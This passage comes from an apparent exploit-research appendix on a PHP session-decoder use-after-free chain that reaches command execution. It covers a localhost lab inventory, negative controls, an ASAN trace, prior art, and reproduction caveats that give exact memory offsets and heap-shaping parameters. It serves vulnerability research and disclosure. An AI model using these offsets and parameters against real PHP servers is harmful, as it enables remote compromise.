| `scripts/gadget_graph.sh` (PHP-Parser facts + `php2shell/gadget_graph.py`) | `reports/gadgets/<app>-graph.{json,md}` | cross-class, but still **candidate generation**: no dataflow, no guard modelling, no runtime autoload proof; a missing `tools/gadget/php/vendor` tree is `BLOCKED`, not zero |

`[file]` The cross-class graph corroborates the G1 chain independently of the
exploit run. `reports/gadgets/drupal-graph.md` (7494 classes, 36321 methods,
193 paths) lists:

```text
score 88  reentry  depth 4
YamlCacheCollectorDiscovery::__destruct -> MenuActiveTrail::destruct
  -> MenuActiveTrail::updateCache -> MemoryBackend::get
  -> MemoryBackend::prepareItem -> unserialize()
  at core/lib/Drupal/Core/Cache/MemoryBackend.php:99
```

It also surfaces higher-scored **untested** candidates, e.g.
`PrototypeConfigurator::__destruct -> PhpFileLoader::registerClasses ->
unserialize()` (vendor Symfony `FileLoader.php:145`, score 97) and a
`__wakeup` path from `StorageComparer` (score 85). Those are candidates only:
the `__wakeup` shape is exactly what C19/C20 falsifies for the re-entry, and
none of the Symfony paths were run through the 115560 decoder. Do not present
the graph as proof.

**Survey statement for any write-up:** the cited negative ("no stock app
combines the switch with a re-entry gadget") comes from the source sweep over
46,508 files in ~60 trees plus manual reading of the multi-object chains. It is
a negative **for those trees and patterns**, not a proof of absence. The graph
tool extends coverage but does not change that ceiling.

---

## 6. Lab inventory on disk (ports, containers, state)

`[recheck]` from `docker ps -a` during this appendix (all rows below were
`Up`; command in §14.2). No host other than `127.0.0.1` is bound.

| Port | Container | Definition | Image | Profile |
|---|---|---|---|---|
| 18200 | `php2shell-115560-8427` | `lab-115560/docker-compose.yml` | `php:8.4.27-apache` | direct, `cleanup=Off` |
| 18201 | `php2shell-115560-8512` | same | `php:8.5.12-apache` | direct, `cleanup=Off` |
| 18202 | `php2shell-115560-8427-noupload` | same | `php:8.4.27-apache` | upload-progress **off** control |
| 18203 | `php2shell-115560-8427-nofunc` | `docker-compose.nofunc.yml` | `php:8.4.27-apache` | `disable_functions` hardened |
| 18204 | `php2shell-115560-8427-race` | `docker-compose.race.yml` | `php:8.4.27-apache` | `cleanup=On` race |
| 18205 | `php2shell-115560-8512-race` | same | `php:8.5.12-apache` | `cleanup=On` race |
| 18206 | `php2shell-115560-8427-workers` | `docker-compose.workers.yml` | `php:8.4.27-apache-arm64` | 8-child prefork |
| 18207 | `php2shell-115560-amd64` | `docker run` (see §4.7) | `php:8.4.27-apache` (`linux/amd64`) | Rosetta amd64 |
| 18208 | `php2shell-115560-8427-offdiag` | `docker-compose.race.yml` | `php:8.4.27-apache` | `cleanup=Off` B′ diagnostic |
| 18209 | `php2shell-115560-8512-offdiag` | same | `php:8.5.12-apache` | `cleanup=Off` B′ diagnostic |
| 18300 | `php2shell-115560-drupal-8427` | `lab-drupal/vdlab/docker-compose.yml` | `php:8.4.27-apache` | Drupal direct |
| 18301 | `php2shell-115560-drupal-8512` | same | `php:8.5.12-apache` | Drupal direct |
| 18302 | `php2shell-115560-drupal-8427-race` | same | `php:8.4.27-apache` | Drupal `cleanup=On` race |
| 18310 | `php2shell-rc-8427` | `lab-roundcube/docker-compose.yml` | `php:8.4.27-apache` | Roundcube plugin profile |
| 18311 | `php2shell-rc-8512` | same | `php:8.5.12-apache` | Roundcube plugin profile |

Other lab trees on disk (`lab-*`) are for the 109618/109619 tracks and are
outside this appendix: `lab-109618`, `lab-109618-fork`, `lab-8235`, `lab-asan`,
`lab-asan-85x`, `lab-asan-fpm`, `lab-asan-modphp`, `lab-defender`, `lab-joomla`,
`lab-matrix`, `lab-patched`, `lab-pinned`, `lab-pure-modphp`, `lab-wordpress`,
`lab-wp-zendmm`, `lab-zendmm-fpm`, `lab-zendmm-fpm-8235`.

ASAN images present locally: `php-asan-8427:local`, `php-asan-8512:local`,
`php-asan-8234:local`.

---

## 7. Complete controls table

Every row is an executed control with a negative result. "No proof" means
`/tmp/vd` was absent or empty after the request, unless stated otherwise.

| # | Control | Build / profile | Command hook | Observed |
|---|---|---|---|---|
| C1 | wrong `zif_system` (+0x1000) | 8.4.27 direct | `--bias-zif 0x1000` | measure OK, `proof=''` |
| C2 | no runtime handler switch | 8.4.27 direct | `--path /noswitch.php` | HTTP 200, no `meas_pid`, `proof=''` |
| C3 | upload progress disabled | 8.4.27 `:18202` | default `run` | no dtor, no `meas_pid`, HTTP 200 |
| C4 | race past window | 8.4.27 race | `--settle 6.0 --attempts 1 --no-remeasure` | only `inv=1 skip-first`; no real dtor |
| C5 | race no persistent first record | 8.4.27 race | `--no-seed --measure-attempts 1 --no-remeasure` | only `inv=1`; no measure/fire |
| C6 | race wrong `zif` | 8.5.12 race | `--bias-zif 0x1000 --attempts 1 --no-remeasure` | real dtor reached, `proof=''` |
| C7 | race other SID | 8.4.27 race | upload SID vs consumer SID differ | `dtor_log='after-session-start\nshutdown\n'` |
| C8 | `disable_functions` + biased zif | 8.4.27 `:18203` | `--bias-zif 0x1000 fire` | `proof=''`, `control_exit=1` |
| C9 | Drupal no 8160 spray | 8.4.27 `:18300` | `--cid-len 100 run` | payload 45810, HTTP 200, no proof |
| C10 | Drupal wrong zif | 8.4.27 `:18300` | `--bias-zif 0x1000 run` | `zif=…2510`, no proof |
| C11 | Drupal race past window | 8.4.27 `:18302` | `--settle 6.0` | hold pid exists, no raw-input magic, `rc=2` |
| C12 | Drupal race no seed | 8.4.27 `:18302` | `--no-seed` | measure payload OK, fire HTTP 200, no proof |
| C13 | Drupal race wrong zif | 8.4.27 `:18302` | `--bias-zif 0x1000` | consumer dies, no `/tmp/vd` |
| C14 | Roundcube wrong zif | 8.4.27 + 8.5.12 | `--bias-zif 0x1000 fire` | `response=<none>`, no proof |
| C15 | Roundcube no switch | 8.4.27 + 8.5.12 | `--noswitch fire` | HTTP 200, no proof |
| C16 | Roundcube no gadget | 8.4.27 + 8.5.12 | `--nogadget fire` | HTTP 200, no proof, no `simple-dtor` |
| C17 | Roundcube stock DB store | 8.4.27 SQLite | `simple` with `session_storage='db'` | no dtor, no `/tmp/vd`; DB row lacks `upload_progress` |
| C18 | amd64 wrong zif | 8.4.27 `:18207` | `--bias-zif 0x1000 fire` | `/tmp/vd` absent |
| C19 | B′ `__wakeup` re-entry | 8.4.27/8.5.12 | `--kind wakeup --placement nondup|dup` | magic called, nested `unserialize` = `boolean(false)` |
| C20 | B′ `__unserialize` re-entry | 8.4.27/8.5.12 | `--kind unserialize --placement nondup|dup` | same, no proof |
| C21 | worker-pool unpinned baseline | 8.4.27 `:18206` | `verify_worker_pinning.py` control | 8 distinct PIDs across 16 responses |

**Load-bearing control:** C1/C6/C8/C10/C13/C14/C18 bias the exact
`zif_system` address by `+0x1000`. In every case the measure succeeds and the
terminal does not fire, so the measured address (not a coincidental crash) is
what produces `uid=33`.

**Negative results are part of the claim, not a defect.** C19/C20 falsify the
public hypothesis that a delayed `__wakeup`/`__unserialize` call can re-enter
the freed chain on these builds: `var_destroy()` holds `BG(serialize_lock)`
around those branches, so the nested parser takes the fresh context branch.
Only the unlocked `i_zval_ptr_dtor()` → `__destruct` path re-enters.

---

## 8. ASAN evidence

### 8.1 How it was obtained

- Image: `lab-asan-85x/Dockerfile`, built with
  `--build-arg PHP_VERSION=8.4.27` as `php-asan-8427:local`. It compiles PHP
  with `--disable-all --enable-session --enable-filter --enable-debug`,
  `CFLAGS="-g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer"`, and
  runs with `USE_ZEND_ALLOC=0`,
  `ASAN_OPTIONS="detect_leaks=0,detect_stack_use_after_return=1"`.
- Harness: `lab-drupal/vd_session_cli.php`. It sets
  `session.serialize_handler=php`, `session.save_handler=files`,
  `session.save_path=$VD_SESSION_DIR`, `session_id($sid)`, then
  `session_start()`. The caller writes a session file in the **`php` wire
  shape** `<ignored-key>|<payload>`, so `ps_srlzr_decode_php()` runs the same
  `php_var_unserialize()` on the bytes after `|` as the HTTP consumer.
- Capture path: write the session file into the ASAN container's session
  directory, then run `php vd_session_cli.php <sid>` inside
  `php-asan-8427:local`; the trace was redirected to
  `asan_session.log`.
- **Honest gap:** the exact shell line that produced the log was not preserved
  in the repo. The log, the image recipe, and the harness are preserved; the
  log's own frame #15 (`ps_srlzr_decode_php`) and #18 (`php_session_start`)
  prove it came from this decode path, not from an application
  `unserialize()` call.

### 8.2 Excerpt (verbatim, elided with `…`)

```text
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0xffffb0a43900
READ of size 8 at 0xffffb0a43900 thread T0
    #0 php_var_unserialize            /usr/src/php/ext/standard/var_unserializer.c:906
    …
    #13 var_destroy                   /usr/src/php/ext/standard/var_unserializer.c:319
    #14 php_var_unserialize_destroy   /usr/src/php/ext/standard/var_unserializer.c:94
    #15 ps_srlzr_decode_php           /usr/src/php/ext/session/session.c:1176
    #16 php_session_decode            /usr/src/php/ext/session/session.c:279
    #17 php_session_initialize        /usr/src/php/ext/session/session.c:506
    #18 php_session_start             /usr/src/php/ext/session/session.c:1753

0xffffb0a43900 is located 0 bytes inside of 8160-byte region
    [0xffffb0a43900,0xffffb0a458e0)
freed by thread T0 here:
    #2 _efree                        /usr/src/php/Zend/zend_alloc.c:2888
    #3 var_destroy                    /usr/src/php/ext/standard/var_unserializer.c:255
previously allocated by thread T0 here:
    #3 var_push                      /usr/src/php/ext/standard/var_unserializer.c:135
    #4 php_var_unserialize_internal   /usr/src/php/ext/standard/var_unserializer.c:943
```

Full log (118 lines):
`/private/var/folders/59/372ydp210wzbvvbgwktc6nmr0000gn/T/opencode/asan_session.log`
(sha256 in §2). This is a **host temp path**, not a repo artifact; copy it into
the repo before relying on it after a reboot.

### 8.3 What the trace establishes, and what it does not

Establishes: the freed region is exactly 8160 bytes (`16 + 8*1018`), freed by
`var_destroy()` at `:255`, and read as an 8-byte slot at `:906` through the
real session decoder. It does not establish the terminal call; that is the
stock-ZendMM `uid=33` result in §1.3/§4.2.

---

## 9. Evidence paths

| Evidence | Path | Kind |
|---|---|---|
| ASAN session-decoder trace | `/private/var/folders/59/372ydp210wzbvvbgwktc6nmr0000gn/T/opencode/asan_session.log` | raw log (host temp) |
| Roundcube 8.4.27 run | `lab-roundcube/evidence/8427.log` | simple, terminal, 3 controls |
| Roundcube 8.5.12 run | `lab-roundcube/evidence/8512.log` | simple, terminal, 3 controls |
| Roundcube write path | `lab-roundcube/evidence/prime-8427.log` | on-disk `php_serialize` record |
| Roundcube runtime log (live) | `/tmp/rc-vd.log` inside container / host bind | plugin load-order markers |
| Drupal / core proof file | `/tmp/vd` inside the target container | terminal output |
| Core dtor sequence | `/tmp/dtor_log` inside the target container | `inv=1`/`inv=2` shape |
| amd64 dtor sequence | `/tmp/dtor_log` on `php2shell-115560-amd64` | measure pid vs fire pid |
| Drupal race proof | `/tmp/vd` on `php2shell-115560-drupal-8427-race` | terminal output |
| Drupal GDB spray map | quoted in `docs/DRUPAL_115560.md` (`probe_npad.py`, `probe_map3.py`) | transcript |
| Frozen baseline | `docs/PHASE0_115560_FREEZE.md` | hashes + positives + controls |
| Gate consolidation | `docs/PHASE1_2_115560_RESULTS.md` | G0–G4 summary |
| Novelty pass | `docs/NOVELTY_115560_2026-10-31.md` | claim matrix and prior art |
| Decision | `docs/PUBLICATION_DECISION_115560.md` | local-only decision |
| Iteration history | `PROGRESS.md` iterations 53–61 | append-only log |

Because `/tmp/vd` and `/tmp/dtor_log` live inside containers, they are
ephemeral. The durable evidence is the quoted output in the docs plus the
Roundcube logs in-tree. Anyone re-running must recreate the proof file.

---

## 10. Known limits and blockers

### 10.1 Preconditions (not a default-PHP bug)

1. **Server config must be `php_serialize` (or `php_binary`)** and the app must
   switch to `php` at runtime before `session_start()`. Default
   `session.serialize_handler` is `php`; 115560 does not apply to it.
2. **`session.upload_progress.enabled=On`** is required (it is the writer).
3. **A loaded class with a re-entry `__destruct()`** that sprays a same-size
   allocation and calls `unserialize()` is required. `__wakeup` /
   `__unserialize` do **not** work on 8.4.27/8.5.12 (C19/C20).
4. **`php_binary` is not usable for this payload shape**: the progress key is
   capped at 127 bytes and the filename route truncates at a NUL.

### 10.2 Application-profile blockers

- **No stock app was found with both halves.** The survey covered 46,508 PHP
  files in ~60 trees; the two halves live in different applications
  (`docs/GADGET_SURVEY_115560.md` §0, §8).
- **Drupal 11.4.11** needs the non-default
  `session.storage.options.serialize_handler: php` line.
- **Roundcube 1.6.11** is plugin-assisted. Stock `session_storage='db'` /
  redis / memcache read their own store, so the upload-progress file is never
  decoded; `session_storage='php'` reads the file but does not perform the
  handler switch. C17 reproduces the DB blocker. A Redis keyspace alignment
  between the server save handler and Roundcube's redis driver was **not
  tested**.
- **PHP 8.5 + Roundcube 1.6.11** needs a compatibility shim:
  Roundcube declares `array_first()`, a PHP 8.5 builtin, so the 8.5.12 service
  sets `disable_functions=array_first` to let the polyfill load. This is
  unrelated to 115560 and does not affect `zif_system`.

### 10.3 Address/architecture limits

- The direct lab runs use a **`/proc`-assisted measure** to get `main`, `lib`,
  and `zif_system`. The no-`/proc` result is an arm64 **brute force** over 512
  two-MiB slots: 8.4.27 attempt 307 / 1238.8 s; 8.5.12 attempt 351 / 1406 s.
- The brute force is **noisy**: a miss kills a worker, so a full sweep crashes
  hundreds of children (availability risk, process-watcher noise).
- **Native x86-64 is not self-contained.** With `mmap_rnd_bits=28` the same
  window is 2^19 = 524,288 candidates. The amd64/Rosetta result is a
  deterministic guest layout, not an ASLR proof. Native x86-64 needs a leak
  (LFI / SSRF / XXE / GH-22554 on 8.4.27).
- The amd64 driver defaults (`--lo 0xFFFF78000000`, `--hi 0xFFFFC0000000`,
  576 slots) are arm64-shaped and do not cover `0x7fff…`.
- 8.5.12 on amd64 was not tested; its GH-22554 leak is fixed.

### 10.4 Worker/race limits

- Multi-worker was tested at **8 children**, not the stock prefork default of
  150. 149 holders should behave identically, but was not run for 115560
  (150-worker pinning is proven elsewhere in this repo for 109619).
- `MaxConnectionsPerChild 0` is required for the fork-inherited `main`
  argument; `apache-single.conf`'s `MaxConnectionsPerChild 1` re-execs the
  child.
- Pinning preserves one free **slot**, not the same PID, because `measure()`
  releases the holder with `kill -9` and Apache respawns. The fork-inherited
  main chunk makes the PID change harmless for this chain.
- No FPM variant of 115560 was tested; FPM would need
  `fastcgi_request_buffering off` at the frontend.
- `cleanup=On` needs a streaming body (> a few seconds) and a second prefork
  child. A frontend that buffers the whole body, or a one-worker pool, is out
  of scope. The Roundcube race was not re-run.

### 10.5 Documentation/evidence limits

- **G3 (breadth fallback) was not run**; it is unnecessary once G1/G2 pass
  (see §1).
- The G0 plan says "four positives" while the freeze table lists five; the
  fifth (8.5.12 race) is an extra positive, so the table is authoritative.
- The ASAN capture command was not preserved (only image, harness, log).
- `/tmp/vd` proof files are ephemeral container state.
- The survey's negative ("no stock gadget") is bounded by the scanned trees and
  patterns; it is not proof that no gadget exists anywhere. Plugin ecosystems
  were not exhaustively downloaded.

---

## 11. Credits and prior art (source-checked)

**Verification basis.** Every row below was checked in the read-only public
record pass of 2026-10-31 (`docs/NOVELTY_115560_2026-10-31.md` §2–§4), which
inspected the named repositories/commits/raw files and advisories. **This
appendix did not re-fetch the URLs** and does not claim an exhaustive GitHub
code search, a search of deleted/private/paywalled/non-English sources, or a
dark-web check. `junaire` is the one citation whose URL could not be re-verified
and is **not** relied on.

### 11.1 Decisive prior art — the composition is public

| Work | Date | What it published | Relation to this repo |
|---|---|---|---|
| **ACD421/PHP** — `weapons/lab/fa_jammy.sh` | 2026-10-26 (commit `6452e82`; tree created 2026-10-24) | Full four stages: rfc1867 session wipe → pre-RINIT INI-UAF → upload-progress plants a 10,493-byte trigger → victim `session_start()` decodes it → `Stage1::__destruct` → `dtor_obj = zif_system` → `system("sh /tmp/fa_jammy_cmd")` → `uid=0` on jammy PHP 8.1.2, ASLR on, no gdb, `MaxRequestWorkers 4` | **The exact composition.** This repo's contribution is the patched-build/arm64/`cleanup=On` port, not the idea |
| ACD421 — `zero1_session_gaps/WRITEUP.md` | 2026-10-21 (repo 2026-10-24) | 115560-class handler mismatch; upload-progress key injection; stock `cleanup=1`, `strict=1` slow-upload race on 8.5.12 (`T3` `uid=0`); `__destruct` on decode failure | The cleanup race and pre-auth delivery are public **before** the CVE was assigned. Gadget was a simple `DeferredWriter`, not var_destroy |
| ACD421 — `zero4_var_destroy_uaf/WRITEUP.md` | 2026-10-21 | var_destroy re-entry UAF, ASAN, 1018 boundary, `__wakeup`/`__unserialize` under `BG(serialize_lock)`, RCE ladder | Public source of the UAF and the lock correction |
| ACD421 — `zero4…/FINISH_ALL_STATUS.md` + `fa_enum_sess_receipt.log` | 2026-10-24 | “All four stages PASS on shot 1”; 8.5.12 session-decode 4/4 `uid=0` via `fa_enum_sess.php` + **locally poisoned session file** | Closest public 8.5.12 session-decode terminal; not pre-auth |
| ACD421 — `zero5_serialize_reentry/WRITEUP.md` | 2026-10-21/23 | Serialize-side mirror; M3 fake `zend_object` + handlers (`dtor_obj = zif_system`) | Public `zif_system` terminal |
| ACD421 — `zero10_slow_bleed/SLOW_BLEED.md` | 2026-10-23 | `cleanup=1` session file states, slow-bleed / TOCTOU, “RCE insertion window” | Public cleanup=On race mechanics |

URL: <https://github.com/ACD421/PHP> ·
<https://github.com/ACD421/PHP/blob/main/weapons/lab/fa_jammy.sh>

**Consequence for wording:** "ACD421 only did the simple gadget" is false, and
"nobody published the composition" must not appear anywhere.

### 11.2 115560 PoCs (pre-auth delivery, simple destructor)

| Work | Date / URL | What it does | Gap vs this chain |
|---|---|---|---|
| **B63** | 2026-10-23, <https://github.com/basesixtythree/B63-POC-CVE-2026-115560> | 115560 pre-auth; `php_binary`/`php_serialize`; direct and `cleanup=1` race; simple file-writing `FileCache` destructor; `uid=33` on 8.4.27/8.5.12 | No memory corruption; no var_destroy; `disable_functions` blocks it |
| **googlesky** | 2026-10-24, <https://github.com/googlesky/CVE-2026-115560> | `uid=33` on `php:8.4.27-apache` in 3.3 s; simple `LabGadget::__destruct`; controls | Simple gadget, no var_destroy |
| **junaire** | reported in local notes; **no stable URL re-verified 2026-10-31** | Handler mismatch; `Logger->cmd` simple destructor; `__destruct` on decode failure | Same class as B63/googlesky; not a re-entry; **excluded from the verdict** |

### 11.3 var_destroy / terminal prior art

| Work | Date / URL | What it proves | Gap |
|---|---|---|---|
| **dinosn** | 2026-05-02, <https://github.com/dinosn/php-8.5.5-var_destroy-uaf> | var_destroy re-entry UAF; full RCE on 8.2.12; `/proc/self/maps` + `/proc/self/mem` | App `unserialize()` sink; `/proc`; not 115560 |
| **Calif MADBugs** | 2026-05-01, <https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a> | var_destroy → forged closure → `zif_system`; `/proc` | App sink; `/proc`; not 115560 |
| **mnk-works Chain B** | 2026-10-21, <https://github.com/mnk-works/php2shell-verify> | var_destroy re-entry UAF, ASAN; Chain B stops at UAF | Needs app `unserialize()`; **no full RCE** |
| **TheCyberGeek** | 2026-10-22/25, <https://github.com/TheCyberGeek/php2shell-research> | var_destroy UAF → `var_dump` handler overwrite with `zif_system` via `/proc/self/mem`; bypasses `disable_functions`; one heap landing offset brute-forced over HTTP | App `unserialize()`; `/proc`; not 115560 |
| **Qi Deng / `ikow`** | 2026-10-21, <https://github.com/ikow/php2shell-poc> | Same var_destroy → `/proc/self/mem` → `zif_system`; `chain_c_mismatch_rce.py` = handler mismatch → `__destruct` | App sink or FPM mismatch; simple gadget in C; not the var_destroy composition |
| **9bie** / EDB 52704 | public before 2026-10-21, <https://github.com/9bie/php2shell-bypass-aslr-exp> | Pre-auth OOM → fake HashTable `pDestructor = zif_system`; stock `php.ini-production`; 150 workers; 10/10 x86-64 and aarch64 | Different bug (109618/19); no var_destroy; pre-auth → `zif_system` and multi-worker are public |
| **devploit** | 2026-10-21/30, <https://github.com/devploit/php2shell> | 56 profiles, 30 RCE; worker pinning; HTTP heap/libphp leaks; amd64 + aarch64 | Different bug; leak-based; no var_destroy |
| **umair-aziz025** / EDB 52704 | 2026-10-23, <https://github.com/umair-aziz025/PHP2Shell> | Stage 3: `PHP_SESSION_UPLOAD_PROGRESS` fake reference, `pDestructor = zif_system`; worker pinning | Different bug; pre-auth `zif_system` without app sink is public, but not 115560 |

### 11.4 PHP advisory / internals

| Source | Date / URL | Use |
|---|---|---|
| PHP release archive / 115560 advisory | 2026-10-23, <https://www.php.net/archive/2026.php> | CVE assignment and handler description |
| `var_destroy()` + delayed flags | <https://github.com/php/php-src/blob/PHP-8.4.27/ext/standard/var_unserializer.re#L245-L325> | Unlocked `i_zval_ptr_dtor` |
| `php_var_unserialize_init()` lock branch | <https://github.com/php/php-src/blob/PHP-8.4.27/ext/standard/var_unserializer.re#L65-L87> | Fresh vs stale chain |
| 8.2.34 / 8.5.12 equivalents | <https://github.com/php/php-src/blob/PHP-8.2.34/ext/standard/var_unserializer.re#L255-L301>, <https://github.com/php/php-src/blob/PHP-8.5.12/ext/standard/var_unserializer.re#L265-L311> | Same defect at older line number (`:850` on 8.2.34) |
| Mitigation write-up | <https://safeguard.sh/resources/blog/php-cve-2026-115560-session-upload-progress-mitigation> | Calls the trigger combination “unlikely in practice” |

### 11.5 Roundcube prior art

| CVE | Date / URL | What it is | Why it is not this |
|---|---|---|---|
| **CVE-2025-49113** | 2025-06-02, <https://nvd.nist.gov/vuln/detail/CVE-2025-49113> | Post-auth `_from` validation bug → `Crypt_GPG_Engine::__destruct` → `proc_open` | Authenticated; simple command-exec gadget; no `unserialize()` re-entry; no var_destroy; no session decoder |
| **CVE-2026-114724** | 2026-10-22 | `rcube_session::unserialize()` object injection | Object injection, not a re-entry UAF; no `zif_system` terminal |

Roundcube is relevant here only as the best **115560 precondition** candidate
app: for its `db`/`redis`/`memcache` session drivers it always runs
`ini_set('session.serialize_handler','php')` before `session_start()`, but
those drivers read their own store, so the upload-progress file is not decoded.
It is not gadget prior art for this chain.

### 11.6 This repo's own non-claims

- `docs/VAR_DESTROY_UAF.md` (2026-10-30/31): the local UAF/terminal ladder,
  ASAN, 1018 boundary, `disable_functions` result. The underlying UAF is
  public (dinosn/Calif); this repo's 8.4.27/8.5.12 application of it is not a
  discovery claim.
- `docs/PHASE0_115560_FREEZE.md`, `PHASE1_2_115560_RESULTS.md`: the frozen
  baseline and the real-app gates.
- `lab-115560/README.md`: the carrier/constants and the `cleanup=On` profile.

---

## 12. Claims to use and claims to avoid

### 12.1 Use these

| Context | Wording |
|---|---|
| Title | “CVE-2026-115560 as a pre-auth delivery path for the `var_destroy` UAF on patched PHP 8.4.27 / 8.5.12” |
| Abstract | “The session-decode primitive delivers the public `var_destroy` re-entry use-after-free to a forged `zif_system` terminal on patched 8.4.27/8.5.12 without an application `unserialize()` sink. The primitives and the four-stage composition are public, most directly in ACD421's `fa_jammy.sh` and `zero1`. Our contribution is the patched-build, default-`cleanup=On`, no-`/proc` arm64 end-to-end result and the carrier/race engineering that makes it repeatable.” |
| Nature of result | “A composition/port/engineering result on top of public primitives; not a new vulnerability, not a new CVE, not a default-PHP exploit.” |
| Scope sentence | “PHP 8.4.27 and 8.5.12, Apache `mod_php`, arm64. Target must configure `php_serialize`/`php_binary`, switch to `php` at runtime before `session_start()`, keep upload progress On, and load a re-entry `__destruct` gadget. Direct profile uses `cleanup=Off`; the default `cleanup=On` path is a streaming race needing a second child and a persistent first record.” |
| Drupal | “Stock Drupal 11.4.11 P5 chain, config-gated by one non-default `serialize_handler: php` line; no harness preload needed.” |
| Roundcube | “Plugin-assisted profile proving the load order and write path; stock db/redis is a reproduced blocker, not a claimed chain.” |
| Hardening | “`disable_functions` does not block the forged `zif_system` call on the tested build; application `allowed_classes=false` and removal of the upload-progress writer do.” |
| Negative result | “`__wakeup`/`__unserialize` are locked and do **not** re-enter; only `__destruct` does.” |

### 12.2 Never write these

| Phrase | Why |
|---|---|
| “first”, “nobody has”, “no public PoC”, “novel composition”, “new chain”, “new class of attack” | ACD421 published the composition on 2026-10-26; `zero1` published the race on 2026-10-21 |
| “default PHP”, “works on any PHP”, “universal”, “pre-auth on stock PHP” | Default handler is `php`; 115560 needs a non-default `php_serialize` + runtime switch |
| “new CVE”, “unreported”, “0-day”, “bypasses the patch” | 115560 is assigned; the UAF is public since 2026-05; the patch does not claim to fix 115560 |
| “no gadget required” | A re-entry `__destruct` is required and is rarer than the public simple gadget |
| “`disable_functions` bypass is new” | Public in TheCyberGeek/Qi Deng and inherent to the forged dtor |
| “multi-worker/pinning is new” | Public in 9bie/devploit/umair, and previously proven here at 150 workers |
| “`cleanup=On` race is new” | Public in ACD421 `zero1`, B63, and `zero10` |
| “remote weapon” / “turnkey exploit” | Carrier address is lab-assisted in direct runs; no-`/proc` is arm64-only and noisy |

**Do not let “embargoed” imply “novel.”** Only the carrier placement, constants,
seed/timing, and arm64 search profile are withheld; the composition is public.

---

## 13. Reproduction caveat — offsets are per request shape

This is the single most important operational warning in the appendix.

1. **`delta` is not a build constant.** It is the offset from the ZendMM main
   chunk to the value string for **one specific request shape**. A different
   consumer page, payload length, session-record count, or app changes it:
   core lab `0x6c019`, core race `0x6d875`/`0x80875`, Drupal `0x7b019` /
   `0x7b875`, Roundcube `0x8d9c1`/`0x9e9c1`, amd64 `0x6c019` (coincidentally
   equal to arm64 core, but the `lib−main` relation and zif offset are not).
2. **`libphp` base is not main-relative.** Re-resolve it per container/build;
   `lib−main` is `+0x2130000` on 8.4.27, `-0x3600000` on 8.5.12,
   `+0x1c07000` on amd64. On 8.4.27 the `zif_system` symbol offset is
   `0x431510`; on amd64 it is `0x46ad70`.
3. **Fresh SID per request/attempt.** Reusing a `PHPSESSID` accumulates
   progress records (10.6 KB → 159 KB), drifts `delta`, and on 8.4.27 removes
   the real dtor (`inv=2`).
4. **Cold start drifts.** The first race measure after a container restart was
   `+0x1e000..0x20000` (`0x8c875` / `0x9e875`), and the first fire crashed
   after `spray-done`. The driver re-measures after a miss; `--no-remeasure`
   disables that and is only for controls.
5. **Two dtors on 8.4.27.** `inv=1` is the dry mid-parse duplicate-key destroy;
   `inv=2` is the real decode-failure `var_destroy` dtor. `m=4` fires on the
   real one, `m=5` holds it for measurement. Firing at `inv=1` gives a stale
   delta and no proof.
6. **Roundcube picks the highest-address session-buffer candidate**, not the
   first magic hit and not the request-body buffer. The lower candidates are
   released before the real dtor. Measure and fire must use different SIDs.
7. **Drupal needs its heap shaping.** `cid_len=8102`, `nk=65`, `npad=4`.
   `cid_len=100` (no 8160 spray) and integer-keyed `keysToPersist` miss; the
   negative is the shaping, not the chain.
8. **8.5 merged VMA workaround.** When the 2 MiB main VMA is merged with an
   adjacent anon VMA, `parse_maps` returns no `main`; the wakeup driver derives
   `main = value_string & ~0x1fffff`. The delta still came out `0x6c019`.
9. **Architecture changes the parser, not the payload.** On amd64 the libphp
   offset-0 mapping is `r--p` and the main chunk starts one page before the
   2 MiB boundary; `measure_amd64.py` corrects this without editing the driver.
10. **A wrong address usually kills the worker, not the request.** The HTTP
    response can be empty on success too; `/tmp/vd` is the terminal evidence.

**Rule:** before quoting any address in a write-up, state the build, the
container, the consumer path, the payload length, the session-record count, and
whether the run was direct or race. Without those, the number is not
reproducible.

---

## 14. Verification receipts for this appendix

### 14.1 Frozen hashes `[recheck]`

```sh
shasum -a 256 poc/verify_115560_vardestroy.py poc/verify_115560_race.py \
  lab-115560/webroot/index.php lab-115560/php-115560.ini \
  poc/verify_115560_drupal.py poc/verify_115560_roundcube.py
```

```text
692d328072435235057b2daca0d60a467a0d3edd1c4b4c4e73f221f3ee3f91c2  poc/verify_115560_vardestroy.py
4e8164627310eb025ce816c6d16b5298de227da5e1c5eda3880889a4d2c82aa3  poc/verify_115560_race.py
c7ad767e19ab176d24d1b24b3bceda17b3b7b7bf4b544a4e743311146c6c3258  lab-115560/webroot/index.php
997f9bd386bc3d5cd05b097cec42496b077bfa937743e06c9d3fd807b120c6bd  lab-115560/php-115560.ini
75f0e6575a4f7f4cb68172d772684904ec35560a307a96030925abd7a4595ad3  poc/verify_115560_drupal.py
d9e0a1175f9e88c20d20f8d9f75950ca0c3be09d1ddb01e35cf6778ebb05f1ef  poc/verify_115560_roundcube.py
```

### 14.2 Lab inventory `[recheck]`

```sh
docker ps -a --format '{{.Names}}\t{{.Status}}\t{{.Ports}}' \
  | grep -E '115560|php2shell-rc' | sort
```

Observed (all `Up`): `php2shell-115560-8427` `:18200`,
`-8512` `:18201`, `-8427-noupload` `:18202`, `-8427-nofunc` `:18203`,
`-8427-race` `:18204`, `-8512-race` `:18205`, `-8427-workers` `:18206`,
`-amd64` `:18207`, `-8427-offdiag` `:18208`, `-8512-offdiag` `:18209`,
`-drupal-8427` `:18300`, `-drupal-8512` `:18301`, `-drupal-8427-race` `:18302`,
`php2shell-rc-8427` `:18310`, `php2shell-rc-8512` `:18311`.

### 14.3 ASAN log `[recheck]`

```sh
shasum -a 256 /private/var/folders/59/372ydp210wzbvvbgwktc6nmr0000gn/T/opencode/asan_session.log
```

```text
cc8021a5e8875a1761f42526ee7a48898a4a61761a4d9ea86c0059b486a1376c
```

### 14.4 Repository gate `[recheck]`

```sh
./scripts/check.sh
```

```text
ok   python compiles (76 files)
ok   modules import (28 modules)
ok   capability registry (18 entries)
ok   entry points (2 CLIs)
ok   required files (25 files)
ok   tooling self-tests (2 self-tests)
ok   goal checklist (active, 5 item(s) checked)

all checks passed
```

`scripts/check.sh` is an **offline consistency gate**. It proves the tree
compiles/imports and that required files and tooling self-tests exist; it does
**not** re-run any exploit and does not prove a claim in this appendix.

### 14.5 Toolchain `[recheck]`

```sh
git rev-parse HEAD; python3 --version; docker --version
```

```text
ed1181edc1ec0d57166e815c3f53bab92b0d95ee
Python 3.14.7
Docker version 29.8.2, build 7fc2dff
```

---

## 15. Bottom line

- **Everything here is local.** No external send, publish, or vendor contact.
